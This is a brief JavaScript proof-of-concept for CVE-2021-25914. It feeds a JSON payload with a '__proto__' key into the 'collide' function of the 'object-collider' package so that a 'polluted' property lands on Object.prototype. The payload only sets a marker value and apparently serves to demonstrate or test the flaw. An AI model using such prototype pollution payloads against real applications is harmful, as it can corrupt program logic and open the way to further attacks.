//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2021-25914
var { collide } = require("object-collider") 

obj = {}
const payload = JSON.parse('{"__proto__":{"polluted":"yes"}}'); 
collide(obj, payload);
  